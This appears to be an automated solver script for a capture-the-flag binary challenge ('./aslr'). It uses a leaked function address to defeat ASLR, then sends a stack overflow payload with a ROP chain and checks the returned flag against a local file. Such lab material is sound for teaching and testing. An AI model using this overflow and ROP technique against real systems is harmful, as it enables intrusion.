#!/usr/bin/env python3
from pwn import *
from time import sleep
import argparse
import sys

#### Setup
parser = argparse.ArgumentParser()
parser.add_argument('host')
parser.add_argument('port', type=int)
args = parser.parse_args()

p = remote(args.host, args.port)

#### Exploit
context.binary = binary = './aslr'
e = ELF(binary)

p.recvuntil('Win function:')

win = int(p.recvline().split(b' ')[-1].strip(), 16)
e.address = win - e.symbols.win

log.info(f'Rebase: {hex(e.address)}')

payload = b'A'*0x58
payload += p64(e.symbols.callme1)
payload += p64(e.symbols.callme2)
payload += p64(e.symbols.win)

p.sendline(payload)

#### Flag check
resp = p.recvuntil(b'}').strip()

flag = resp.split(b'\n')[-1].split(b' ')[-1].decode()
if flag in open('flag.txt').read():
    log.success(f'SUCCESS: {flag}')
    sys.exit(0)

log.critical('Failed!')
sys.exit(1)
